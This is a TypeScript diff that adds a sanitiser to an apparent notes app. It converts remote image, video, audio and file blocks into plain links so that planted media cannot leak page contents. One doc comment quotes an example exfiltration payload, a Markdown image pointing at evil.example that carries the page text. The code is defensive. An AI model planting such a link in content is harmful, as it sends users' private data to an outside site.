@@ -110,3 +110,40 @@ export function blockFullText(block: BlockLike): string {
     .map((b) => b.text)
     .join('\n');
 }
+
+/** Block types whose `url` the browser loads by itself when the page is shown. */
+const AUTO_LOADING = new Set(['image', 'video', 'audio', 'file']);
+
+/** A URL on Kinote itself (a path, not `//host`): loading it tells no other site anything. */
+function isOwnUrl(url: unknown): boolean {
+  return typeof url === 'string' && url.startsWith('/') && !url.startsWith('//') && !url.startsWith('/\\');
+}
+
+/**
+ * Blocks written from Markdown by the engine, an agent or the API, with every
+ * image, video, audio or file block that points at another site turned into a
+ * plain paragraph link to it. Such a block loads its URL for every reader, so
+ * a planted `![](https://evil.example/?d=<page text>)` would send the page to
+ * that site; a link only goes there when someone clicks it. Kinote's own files
+ * (relative URLs) stay as they are. Nested children are walked too.
+ */
+export function stripRemoteMedia<T extends BlockLike>(blocks: T[]): T[] {
+  return blocks.map((block) => {
+    const children = block.children ? stripRemoteMedia(block.children) : block.children;
+    const url = block.props?.url;
+    if (!AUTO_LOADING.has(block.type) || isOwnUrl(url) || typeof url !== 'string' || url === '') {
+      return { ...block, ...(children ? { children } : {}) };
+    }
+    const label =
+      (typeof block.props?.caption === 'string' && block.props.caption) ||
+      (typeof block.props?.name === 'string' && block.props.name) ||
+      url;
+    return {
+      ...block,
+      type: 'paragraph',
+      props: {},
+      content: [{ type: 'link', href: url, content: [{ type: 'text', text: label, styles: {} }] }],
+      ...(children ? { children } : {}),
+    } as T;
+  });
+}
